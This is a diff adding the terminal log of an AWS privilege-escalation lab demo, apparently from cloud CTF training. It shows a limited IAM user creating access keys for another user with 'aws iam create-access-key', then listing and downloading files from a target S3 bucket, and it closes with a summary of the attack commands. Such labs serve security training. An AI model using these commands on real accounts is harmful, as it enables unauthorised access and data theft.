@@ -1,0 +1,108 @@
+[0;32m========================================[0m
+[0;32mIAM CreateAccessKey to S3 Bucket Access Demo[0m
+[0;32m========================================[0m
+
+[1;33mNote: This scenario requires Terraform outputs for the privesc user credentials[0m
+[1;33mMake sure you have deployed this scenario with Terraform first[0m
+
+[1;33mStep 1: Retrieving privesc user credentials from Terraform[0m
+Privesc user: pl-prod-iam-002-to-bucket-privesc-user
+Access Key ID: AKIA54WIGF...
+ReadOnly Key ID: AKIA54WIGF...
+[0;32m✓ Retrieved credentials[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS credentials for privesc user[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-iam-002-to-bucket-privesc-user
+[0;32m✓ Verified identity as privesc user[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Testing current permissions[0m
+Attempting to list S3 buckets...
+[2m[Attacker] $ aws s3 ls[0m
+[0;32m✓ Confirmed: Cannot list S3 buckets with privesc user[0m
+
+[1;33mStep 5: Creating access keys for pl-prod-iam-002-to-bucket-access-user[0m
+This is the privilege escalation vector...
+
+[0;36m[Attacker] $ aws iam create-access-key --user-name pl-prod-iam-002-to-bucket-access-user --output json[0m
+Created new access key: AKIAXXXXXXXXXXXXXXXXXX
+[0;32m✓ Successfully created access keys for bucket access user[0m
+
+[1;33mWaiting 15 seconds for access keys to initialize...[0m
+
+[1;33mStep 6: Switching to bucket access user credentials[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+New identity: arn:aws:iam::123456789012:user/pl-prod-iam-002-to-bucket-access-user
+[0;32m✓ Switched to bucket access user credentials[0m
+
+[1;33mStep 7: Identifying target bucket[0m
+Target bucket: pl-prod-iam-002-to-bucket-954976316246-8r33j6
+[0;32m✓ Identified target bucket from scenario configuration[0m
+
+[1;33mStep 8: Listing bucket contents[0m
+Contents of pl-prod-iam-002-to-bucket-954976316246-8r33j6:
+
+[0;36m[Attacker] $ aws s3 ls s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/[0m
+2026-05-15 22:42:45         40 flag.txt
+2026-05-15 22:42:45        138 sensitive-data.txt
+[0;32m✓ Successfully listed bucket contents[0m
+
+[1;33mStep 9: Downloading sensitive data[0m
+
+[0;36m[Attacker] $ aws s3 cp s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/sensitive-data.txt /tmp/createaccesskey-bucket-sensitive-data-954976316246.txt[0m
+Completed 138 Bytes/138 Bytes (119 Bytes/s) with 1 file(s) remaining
+download: s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/sensitive-data.txt to ../../../../../../../../../../../../tmp/createaccesskey-bucket-sensitive-data-954976316246.txt
+
+[0;32m✓ Successfully downloaded sensitive file[0m
+[1;33mContents of sensitive file:[0m
+🎉 SUCCESS! You've accessed the S3 bucket via iam:CreateAccessKey privilege escalation.
+
+Flag: PATHFINDER-CREATEACCESSKEY-TO-BUCKET-2024
+[1;33mStep 10: Capturing CTF flag from S3 bucket[0m
+
+[0;36m[Attacker] $ aws s3 cp s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/flag.txt -[0m
+[0;32m✓ Flag captured: flag{iam_002_bucket_access_via_new_keys}[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-iam-002-to-bucket-privesc-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-iam-002-to-bucket-privesc-user (limited permissions, no S3 access)
+2. Created access keys for pl-prod-iam-002-to-bucket-access-user using iam:CreateAccessKey
+3. Switched to new credentials for bucket access user
+4. Discovered and accessed target bucket: pl-prod-iam-002-to-bucket-954976316246-8r33j6
+5. Captured CTF flag from s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/flag.txt: flag{iam_002_bucket_access_via_new_keys}
+
+[1;33mAttack Path:[0m
+  pl-prod-iam-002-to-bucket-privesc-user → (iam:CreateAccessKey) → pl-prod-iam-002-to-bucket-access-user → pl-prod-iam-002-to-bucket-954976316246-8r33j6
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws iam create-access-key --user-name pl-prod-iam-002-to-bucket-access-user --output json[0m
+  [0;36m$ aws s3 ls s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/[0m
+  [0;36m$ aws s3 cp s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/sensitive-data.txt /tmp/createaccesskey-bucket-sensitive-data-954976316246.txt[0m
+  [0;36m$ aws s3 cp s3://pl-prod-iam-002-to-bucket-954976316246-8r33j6/flag.txt -[0m
+
+[1;33mAttack Artifacts:[0m
+- New IAM access key: AKIAXXXXXXXXXXXXXXXXXX
+- Downloaded file: /tmp/createaccesskey-bucket-sensitive-data-954976316246.txt
+
+
+[0;31mIMPORTANT: Run cleanup_attack.sh to delete the created access keys[0m
+[0;31mAccess Key ID to delete: AKIAXXXXXXXXXXXXXXXXXX[0m
+
+[1;33mTo clean up:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
